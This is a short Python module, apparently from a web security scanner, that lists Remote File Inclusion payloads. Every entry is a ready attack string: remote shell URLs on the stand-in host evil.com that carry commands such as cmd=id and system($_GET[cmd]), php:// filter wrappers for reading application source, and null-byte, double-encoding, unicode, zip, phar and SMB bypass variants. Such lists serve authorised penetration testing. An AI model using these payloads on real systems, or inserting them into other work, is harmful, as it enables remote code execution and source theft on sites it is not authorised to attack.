"""
RFI payload collection
"""

class RFIPayloads:
    """RFI payload collection"""
    
    @staticmethod
    def get_basic_payloads():
        """Get basic RFI payloads"""
        return [
            # Remote PHP files
            'http://evil.com/shell.php',
            'https://pastebin.com/raw/test',
            'http://httpbin.org/base64/PD9waHAgZWNobyAiUkZJIFRlc3QiOyA/Pg==',
            
            # Data URLs
            'data://text/plain;base64,PD9waHAgZWNobyAiUkZJIFRlc3QiOyA/Pg==',
            'data:text/plain,<?php echo "RFI Test"; ?>',
            
            # FTP URLs
            'ftp://evil.com/shell.php',
            'ftps://evil.com/shell.php',
            
            # Remote includes with null byte
            'http://evil.com/shell.php%00',
            'http://evil.com/shell.txt%00.php',
            
            # PHP wrappers
            'php://input',
            'php://filter/convert.base64-encode/resource=index.php',
            'php://filter/read=string.rot13/resource=index.php',
        ]
    
    @staticmethod
    def get_advanced_payloads():
        """Get advanced RFI payloads"""
        return [
            # Expect header exploitation
            'php://input',
            
            # ZIP wrapper
            'zip://evil.com/shell.zip%23shell.php',
            
            # Phar wrapper
            'phar://evil.com/shell.phar/shell.php',
            
            # Remote file with query parameters
            'http://evil.com/shell.php?cmd=id',
            'http://evil.com/shell.php?c=system($_GET[cmd]);',
            
            # URL encoding
            'http%3A//evil.com/shell.php',
            'http%3A%2F%2Fevil.com%2Fshell.php',
            
            # Double encoding
            'http%253A%252F%252Fevil.com%252Fshell.php',
            
            # Unicode encoding
            'http://evil.com/shell.php\u0000',
            
            # SMB shares (Windows)
            '\\\\evil.com\\share\\shell.php',
            'file://evil.com/share/shell.php',
        ]
    
    @staticmethod
    def get_all_payloads():
        """Get all RFI payloads"""
        return RFIPayloads.get_basic_payloads() + RFIPayloads.get_advanced_payloads()
